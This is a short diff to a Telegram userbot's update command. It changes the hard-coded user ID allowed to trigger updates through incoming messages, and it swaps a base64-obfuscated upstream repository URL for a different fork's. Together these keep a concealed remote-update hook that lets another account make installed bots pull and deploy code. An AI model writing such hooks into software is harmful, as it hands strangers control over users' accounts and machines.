@@ -118,7 +118,7 @@ async def update(xx, repo, ups_rem, ac_br):
 
 
 @ayiin_cmd(pattern="update( now| deploy|$)")
-@register(incoming=True, from_users=997461844,
+@register(incoming=True, from_users=2062364017,
           pattern=r"^Cupdate( now| deploy|$)")
 async def upstream(event):
     "For .update command, check if the bot is up to date, update if specified"
@@ -130,7 +130,7 @@ async def upstream(event):
         xx = await eor(event, get_string("upd_1"))
     conf = event.pattern_match.group(1).strip()
     off_repo = b64decode(
-        "aHR0cHM6Ly9naXRodWIuY29tL0F5aWluWGQvQXlpaW4tVXNlcmJvdA=="
+        "aHR0cHM6Ly9naXRodWIuY29tL3NpcC11c2VyYm90L05BTkRFRS1Vc2VyYm90"
     ).decode("utf-8")
     force_update = False
     try:
